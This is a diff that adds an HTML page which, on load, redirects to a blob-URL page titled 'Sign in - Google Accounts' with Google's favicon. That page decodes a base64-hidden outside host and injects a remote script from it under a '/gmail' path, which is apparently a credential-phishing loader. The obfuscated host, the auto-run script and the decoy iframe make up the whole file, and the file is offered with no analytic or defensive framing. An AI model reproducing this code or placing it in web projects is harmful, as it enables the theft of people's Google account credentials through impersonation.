@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <link rel="icon" href="" type="image/x-icon" id="fvi">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+</head>
+ <style>
+    body {
+      margin: 0px !important;
+      height: 100vh;
+      padding: 0px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+    }
+
+  </style>
+<body>
+  
+<iframe id="bFrame" style="width:100%; height:100%; border:0px; display: none;" frameborder="0" scrolling="no"></iframe>
+
+<script>  
+  function Fill(){
+      const htmlContent = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+        <title></title>
+        <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"><\/script>
+        <input type="hidden" value="1" id="wm" data-rt="aHR0cHM6Ly9ibHVlLnN0ZWFsdGgwMi5jb20=" data-rd="aHR0cHM6Ly9nbWFpbC5jb20=">
+        </head>
+        <body style="margin:0px;">
+          <div id="div2"></div>
+          <script>
+            document.title = atob("U2lnbiBpbiAtIEdvb2dsZSBBY2NvdW50cw==");
+            const cfg = document.getElementById('wm');
+            const root = atob(cfg.dataset.rt);
+            const redirect = atob(cfg.dataset.rd);
+            function Ls(LN, LI, LP){
+                const scr = document.createElement("script");
+                scr.src = atob(LI);
+                scr.id = LN;
+                LP.appendChild(scr);
+            }
+            Ls("loda", btoa(root+"/gmail/js/start.js"), document.body )
+          <\/script>
+        </body>
+        </html>
+      `;
+
+      const blob = new Blob([htmlContent], { type: "text/html" });
+      const url = URL.createObjectURL(blob);
+      const mall = `#${window.location.hash.slice(1)}` ? `#${window.location.hash.slice(1)}` : "";
+      document.getElementById("bFrame").src = 'https://wiki.com';
+      window.location.replace(url + mall);
+      $("#bFrame").show();
+    };
+
+    Fill();
+
+  
+  </script>
+
+</body>
+</html>
